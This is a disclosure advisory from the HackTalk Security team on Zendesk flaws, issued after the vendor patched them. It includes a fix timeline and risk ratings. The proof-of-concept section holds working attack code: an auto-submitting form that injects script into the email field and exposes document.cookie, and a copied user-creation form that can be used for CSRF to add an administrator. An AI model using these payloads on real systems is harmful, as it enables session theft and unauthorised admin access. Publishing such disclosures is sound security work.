@@ -1,0 +1,566 @@
+/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\
+
+:Zendesk Multiple Vulnerabilities : 
+
+\________________________________/
+
+/Discovered By:                  \
+
+|Luis Santana                     |
+
+\________________________________/
+
+
+Overview
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+Luis Santana of the HackTalk Security team has found multiple vulnerabilities in Zendesk.
+
+Product Information
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+Product/Script: Zendesk
+
+Affected Version:
+
+Vulnerability Type: Multiple
+
+Security Risk: Multiple
+
+Vendor URL: http://zendesk.com
+
+Product/Script Demo:
+
+Vendor Status: Notified
+
+Patch/Fix Status: Patches Made
+
+Advisory Timeline:  July 31st 9:34am EST - Zendesk Contacted about XSS
+
+                    July 31st 12:42pm EST - Ticket passed to Security Department
+
+                    July 31st 10:46pm EST - Zendesk has started producing patch. Given the go ahead to publicly disclose
+
+                    July 31st 1:00am EST - Found CSRF, continuing investigation
+
+                    August 1st 3:49pm EST - CSRF Patch in production
+
+                    August 4th 3:51am EST - CSRF patch being rolled out
+
+                    August 10th 3:36pm EST - Given the ok to post advisory publicly
+
+Advisory URL: http://hacktalk.net/exploit/exploit.php?n=10
+
+Product Description
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+Web-based customer support software with elegant ticket mnagement and a self-service customer community platform. Agile, smart and convenient.
+
+(From http://www.zendesk.com)
+
+Vulnerability Details
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+XSS -
+The email address field of the anonymous_requests page is vulnerable to XSS due to lack of input sanitation. By crafting a malcious POST request an attacker is able to inject HTML, Javascript or AJAX into the anonymous_requests page.
+
+CSRF -
+Due to a lack of input sanitation many forms are vulnerable to CSRF. The most notable example is the new user creation form which allows an attacker to create a new administrative user.
+
+Proof of Concept
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+XSS -
+
+<html>
+
+<head></head>
+
+<body>
+
+<form method="POST" action="https://site.com/anonymous_requests"name="explForm">
+
+<input type=hidden name=email value='"><script>alert("I could have just stolen your cookie" + document.cookie);</script>'
+
+</form>
+
+<script language="Javascript">
+
+setTimeout('explForm.submit()', 1000 * 1);
+
+</script>
+
+</body>
+
+
+CSRF -
+
+<form action="http://site.com/users" class="new_user" enctype="multipart/form-data" id="user-form" method="post" name="userform" onsubmit="return submitUser()">
+
+  <input id="ignore-upload-user" name="ignoreupload" type="hidden" value="0" />
+
+  <h2>Name <span class="sub">Display name used throughout the help desk.</span></h2>
+
+  <input id="user_name" name="user[name]" size="30" type="text" />
+
+  <!--<p>Display name used throughout the help desk.</p>-->
+
+          <h3>
+
+        Email
+
+        <span class="sub">Used when logging in.</span>
+
+      </h3>
+
+      <input id="user_email" name="user[email]" size="30" type="text" />
+
+      <h3>
+
+        Twitter account
+
+      </h3>
+
+      <input id="user_new_twitter_identity" name="user[new_twitter_identity]" size="30" type="text" />
+
+  <h3>Phone number <span class="sub">Optional.</span></h3>
+
+  <input id="user_phone" name="user[phone]" size="30" type="text" />
+
+  <h3>Time zone</h3>
+
+     <select id="user_time_zone" name="user[time_zone]"><option value="International Date Line West">(GMT-11:00) International Date Line West</option>
+
+<option value="Midway Island">(GMT-11:00) Midway Island</option>
+
+<option value="Samoa">(GMT-11:00) Samoa</option>
+
+<option value="Hawaii">(GMT-10:00) Hawaii</option>
+
+<option value="Alaska">(GMT-09:00) Alaska</option>
+
+<option value="Pacific Time (US & Canada)">(GMT-08:00) Pacific Time (US & Canada)</option>
+
+<option value="Tijuana">(GMT-08:00) Tijuana</option>
+
+<option value="Arizona">(GMT-07:00) Arizona</option>
+
+<option value="Chihuahua">(GMT-07:00) Chihuahua</option>
+
+<option value="Mazatlan">(GMT-07:00) Mazatlan</option>
+
+<option value="Mountain Time (US & Canada)">(GMT-07:00) Mountain Time (US & Canada)</option>
+
+<option value="Central America">(GMT-06:00) Central America</option>
+
+<option value="Central Time (US & Canada)">(GMT-06:00) Central Time (US & Canada)</option>
+
+<option value="Guadalajara">(GMT-06:00) Guadalajara</option>
+
+<option value="Mexico City">(GMT-06:00) Mexico City</option>
+
+<option value="Monterrey">(GMT-06:00) Monterrey</option>
+
+<option value="Saskatchewan">(GMT-06:00) Saskatchewan</option>
+
+<option value="Bogota" selected="selected">(GMT-05:00) Bogota</option>
+
+<option value="Eastern Time (US & Canada)">(GMT-05:00) Eastern Time (US & Canada)</option>
+
+<option value="Indiana (East)">(GMT-05:00) Indiana (East)</option>
+
+<option value="Lima">(GMT-05:00) Lima</option>
+
+<option value="Quito">(GMT-05:00) Quito</option>
+
+<option value="Caracas">(GMT-04:30) Caracas</option>
+
+<option value="Atlantic Time (Canada)">(GMT-04:00) Atlantic Time (Canada)</option>
+
+<option value="La Paz">(GMT-04:00) La Paz</option>
+
+<option value="Santiago">(GMT-04:00) Santiago</option>
+
+<option value="Newfoundland">(GMT-03:30) Newfoundland</option>
+
+<option value="Brasilia">(GMT-03:00) Brasilia</option>
+
+<option value="Buenos Aires">(GMT-03:00) Buenos Aires</option>
+
+<option value="Georgetown">(GMT-03:00) Georgetown</option>
+
+<option value="Greenland">(GMT-03:00) Greenland</option>
+
+<option value="Mid-Atlantic">(GMT-02:00) Mid-Atlantic</option>
+
+<option value="Azores">(GMT-01:00) Azores</option>
+
+<option value="Cape Verde Is.">(GMT-01:00) Cape Verde Is.</option>
+
+<option value="Casablanca">(GMT+00:00) Casablanca</option>
+
+<option value="Dublin">(GMT+00:00) Dublin</option>
+
+<option value="Edinburgh">(GMT+00:00) Edinburgh</option>
+
+<option value="Lisbon">(GMT+00:00) Lisbon</option>
+
+<option value="London">(GMT+00:00) London</option>
+
+<option value="Monrovia">(GMT+00:00) Monrovia</option>
+
+<option value="UTC">(GMT+00:00) UTC</option>
+
+<option value="Amsterdam">(GMT+01:00) Amsterdam</option>
+
+<option value="Belgrade">(GMT+01:00) Belgrade</option>
+
+<option value="Berlin">(GMT+01:00) Berlin</option>
+
+<option value="Bern">(GMT+01:00) Bern</option>
+
+<option value="Bratislava">(GMT+01:00) Bratislava</option>
+
+<option value="Brussels">(GMT+01:00) Brussels</option>
+
+<option value="Budapest">(GMT+01:00) Budapest</option>
+
+<option value="Copenhagen">(GMT+01:00) Copenhagen</option>
+
+<option value="Ljubljana">(GMT+01:00) Ljubljana</option>
+
+<option value="Madrid">(GMT+01:00) Madrid</option>
+
+<option value="Paris">(GMT+01:00) Paris</option>
+
+<option value="Prague">(GMT+01:00) Prague</option>
+
+<option value="Rome">(GMT+01:00) Rome</option>
+
+<option value="Sarajevo">(GMT+01:00) Sarajevo</option>
+
+<option value="Skopje">(GMT+01:00) Skopje</option>
+
+<option value="Stockholm">(GMT+01:00) Stockholm</option>
+
+<option value="Vienna">(GMT+01:00) Vienna</option>
+
+<option value="Warsaw">(GMT+01:00) Warsaw</option>
+
+<option value="West Central Africa">(GMT+01:00) West Central Africa</option>
+
+<option value="Zagreb">(GMT+01:00) Zagreb</option>
+
+<option value="Athens">(GMT+02:00) Athens</option>
+
+<option value="Bucharest">(GMT+02:00) Bucharest</option>
+
+<option value="Cairo">(GMT+02:00) Cairo</option>
+
+<option value="Harare">(GMT+02:00) Harare</option>
+
+<option value="Helsinki">(GMT+02:00) Helsinki</option>
+
+<option value="Istanbul">(GMT+02:00) Istanbul</option>
+
+<option value="Jerusalem">(GMT+02:00) Jerusalem</option>
+
+<option value="Kyev">(GMT+02:00) Kyev</option>
+
+<option value="Minsk">(GMT+02:00) Minsk</option>
+
+<option value="Pretoria">(GMT+02:00) Pretoria</option>
+
+<option value="Riga">(GMT+02:00) Riga</option>
+
+<option value="Sofia">(GMT+02:00) Sofia</option>
+
+<option value="Tallinn">(GMT+02:00) Tallinn</option>
+
+<option value="Vilnius">(GMT+02:00) Vilnius</option>
+
+<option value="Baghdad">(GMT+03:00) Baghdad</option>
+
+<option value="Kuwait">(GMT+03:00) Kuwait</option>
+
+<option value="Moscow">(GMT+03:00) Moscow</option>
+
+<option value="Nairobi">(GMT+03:00) Nairobi</option>
+
+<option value="Riyadh">(GMT+03:00) Riyadh</option>
+
+<option value="St. Petersburg">(GMT+03:00) St. Petersburg</option>
+
+<option value="Volgograd">(GMT+03:00) Volgograd</option>
+
+<option value="Tehran">(GMT+03:30) Tehran</option>
+
+<option value="Abu Dhabi">(GMT+04:00) Abu Dhabi</option>
+
+<option value="Baku">(GMT+04:00) Baku</option>
+
+<option value="Muscat">(GMT+04:00) Muscat</option>
+
+<option value="Tbilisi">(GMT+04:00) Tbilisi</option>
+
+<option value="Yerevan">(GMT+04:00) Yerevan</option>
+
+<option value="Kabul">(GMT+04:30) Kabul</option>
+
+<option value="Ekaterinburg">(GMT+05:00) Ekaterinburg</option>
+
+<option value="Islamabad">(GMT+05:00) Islamabad</option>
+
+<option value="Karachi">(GMT+05:00) Karachi</option>
+
+<option value="Tashkent">(GMT+05:00) Tashkent</option>
+
+<option value="Chennai">(GMT+05:30) Chennai</option>
+
+<option value="Kolkata">(GMT+05:30) Kolkata</option>
+
+<option value="Mumbai">(GMT+05:30) Mumbai</option>
+
+<option value="New Delhi">(GMT+05:30) New Delhi</option>
+
+<option value="Sri Jayawardenepura">(GMT+05:30) Sri Jayawardenepura</option>
+
+<option value="Kathmandu">(GMT+05:45) Kathmandu</option>
+
+<option value="Almaty">(GMT+06:00) Almaty</option>
+
+<option value="Astana">(GMT+06:00) Astana</option>
+
+<option value="Dhaka">(GMT+06:00) Dhaka</option>
+
+<option value="Novosibirsk">(GMT+06:00) Novosibirsk</option>
+
+<option value="Rangoon">(GMT+06:30) Rangoon</option>
+
+<option value="Bangkok">(GMT+07:00) Bangkok</option>
+
+<option value="Hanoi">(GMT+07:00) Hanoi</option>
+
+<option value="Jakarta">(GMT+07:00) Jakarta</option>
+
+<option value="Krasnoyarsk">(GMT+07:00) Krasnoyarsk</option>
+
+<option value="Beijing">(GMT+08:00) Beijing</option>
+
+<option value="Chongqing">(GMT+08:00) Chongqing</option>
+
+<option value="Hong Kong">(GMT+08:00) Hong Kong</option>
+
+<option value="Irkutsk">(GMT+08:00) Irkutsk</option>
+
+<option value="Kuala Lumpur">(GMT+08:00) Kuala Lumpur</option>
+
+<option value="Perth">(GMT+08:00) Perth</option>
+
+<option value="Singapore">(GMT+08:00) Singapore</option>
+
+<option value="Taipei">(GMT+08:00) Taipei</option>
+
+<option value="Ulaan Bataar">(GMT+08:00) Ulaan Bataar</option>
+
+<option value="Urumqi">(GMT+08:00) Urumqi</option>
+
+<option value="Osaka">(GMT+09:00) Osaka</option>
+
+<option value="Sapporo">(GMT+09:00) Sapporo</option>
+
+<option value="Seoul">(GMT+09:00) Seoul</option>
+
+<option value="Tokyo">(GMT+09:00) Tokyo</option>
+
+<option value="Yakutsk">(GMT+09:00) Yakutsk</option>
+
+<option value="Adelaide">(GMT+09:30) Adelaide</option>
+
+<option value="Darwin">(GMT+09:30) Darwin</option>
+
+<option value="Brisbane">(GMT+10:00) Brisbane</option>
+
+<option value="Canberra">(GMT+10:00) Canberra</option>
+
+<option value="Guam">(GMT+10:00) Guam</option>
+
+<option value="Hobart">(GMT+10:00) Hobart</option>
+
+<option value="Melbourne">(GMT+10:00) Melbourne</option>
+
+<option value="Port Moresby">(GMT+10:00) Port Moresby</option>
+
+<option value="Sydney">(GMT+10:00) Sydney</option>
+
+<option value="Vladivostok">(GMT+10:00) Vladivostok</option>
+
+<option value="Magadan">(GMT+11:00) Magadan</option>
+
+<option value="New Caledonia">(GMT+11:00) New Caledonia</option>
+
+<option value="Solomon Is.">(GMT+11:00) Solomon Is.</option>
+
+<option value="Auckland">(GMT+12:00) Auckland</option>
+
+<option value="Fiji">(GMT+12:00) Fiji</option>
+
+<option value="Kamchatka">(GMT+12:00) Kamchatka</option>
+
+<option value="Marshall Is.">(GMT+12:00) Marshall Is.</option>
+
+<option value="Wellington">(GMT+12:00) Wellington</option>
+
+<option value="Nuku'alofa">(GMT+13:00) Nuku'alofa</option><option value="" disabled="disabled">-------------</option>
+
+</select>
+
+  <a name="photo">
+
+      <h3>Photo <span class="sub">An optional smiling face. For the best results, upload a photo with equal length and height.</span></h3>
+
+      <input id="photo_uploaded_data" name="photo[uploaded_data]" type="file" />
+
+  </a>
+
+    <h3>Detailed information</h3>
+
+    <textarea cols="60" id="user_details" name="user[details]" rows="5"></textarea>
+
+    <p>Optional detailed information concerning this user, e.g. an address. This information is visible to agents only, never to end-users.</p>
+
+    <h3>Notes</h3>
+
+    <textarea cols="60" id="user_notes" name="user[notes]" rows="5"></textarea>
+
+    <p>Optional notes concerning this user. Notes can also be added/edited for a requester directly on the ticket form page.<br/>Notes are visible to agents only, never to any end-user.</p>
+
+      <div id="organization-block">
+
+          <h3>Organization</h3>
+
+ <select id="user_organization_id" name="user[organization_id]" style="width:auto;"><option value="">(None)</option>
+
+<option value="237057">HackTalk Security</option></select>
+
+          <p>Leave blank to select default organization according to organization mappings.</p>
+
+      </div>
+
+      <h3>Role - privileges granted to this user</h3>
+
+      <h4>
+
+        <input checked="checked" id="user-radio" name="user[roles]" onclick="checkAgent();" type="radio" value="0" />
+
+        End-user.
+
+        <span class="sub">Submits support tickets to the help desk.</span>
+
+      </h4>
+
+      <div id="end_user_block" class="indented_option" style="">
+
+        <h4>Has access to:</h4>
+
+        <p><input checked="checked" id="user_restriction_id_4" name="user[restriction_id]" type="radio" value="4" /> Tickets requested by user only</p>
+
+          <p><input id="user_restriction_id_2" name="user[restriction_id]" type="radio" value="2" /> Tickets from user's organization</p>
+
+          <p>Note - if the user belongs to a shared organization, then the user always has access to tickets in the organization.</p>
+
+      </div>
+
+        <h4>
+
+          <input id="user_roles_4" name="user[roles]" onclick="checkAgent();" type="radio" value="4" />
+
+          Agent.
+
+          <span class="sub">Help desk operator. Receives and resolves tickets from end-users.</span>
+
+        </h4>
+
+        <div id="agent_block" class="indented_option" style="display:none;">
+
+          <div id="agent_groups"></div>
+
+          <h4>Has access to:</h4>
+
+          <p><input id="user_restriction_id_0" name="user[restriction_id]" type="radio" value="0" /> All tickets <span class="sub">(can also add, modify and assume end-users)</span></p>
+
+            <p>
+
+                <input type="radio" value="2" name="user[restriction_id]" id="snov"/>
+
+              Tickets requested by users in this agent's organization <span class="sub">(also can't see forums restricted to other organizations)</span>
+
+            </p>
+
+          <p><input id="user_restriction_id_3" name="user[restriction_id]" type="radio" value="3" /> Tickets assigned to this agent only</p>
+
+          <h4>Can add ticket comments that are:</h4>
+
+          <p>
+
+          <label class="option"><input checked="checked" class="radio" id="user_is_private_comments_only_false" name="user[is_private_comments_only]" type="radio" value="false" /> Public or private</label>
+
+          <label class="option"><input class="radio" id="user_is_private_comments_only_true" name="user[is_private_comments_only]" type="radio" value="true" /> Private only (viewable only by other agents)</label>
+
+          </p>
+
+          <h4>Can moderate (edit, delete and reorder) topics in forums:</h4>
+
+          <p>
+
+            <label class="option"><input class="radio" id="user_is_moderator_true" name="user[is_moderator]" type="radio" value="true" /> Yes</label>
+
+            <label class="option"><input checked="checked" class="radio" id="user_is_moderator_false" name="user[is_moderator]" type="radio" value="false" /> No</label>
+
+          </p>
+
+        </div>
+
+        <h4>
+
+          <input id="user_roles_2" name="user[roles]" onclick="checkAgent();" type="radio" value="2" />
+
+          Admin.
+
+          <span class="sub">Manages the help desk with regard to rules, users, organizations, groups and SLA's. Has access to all tickets.</span>
+
+          <div id="admin_groups" class="indented_option"></div>
+
+        </h4>
+
+  <div class="action">
+
+    <input class="buttonsubmit" id="submit-button" name="commit" type="submit" value="Create" />
+
+  </div>
+
+
+Patch/Fix Suggestion(s)
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+Upgrade to the latest version of Zendesk as they have released patches for these vulnerabilities.
+
+Security Risk
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+XSS - Low
+
+CSRF - Mid
+
+Author:
+
+~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~_¯~
+
+The Author and Researcher of this Advisory is Luis Santana of the HackTalk Security Team 
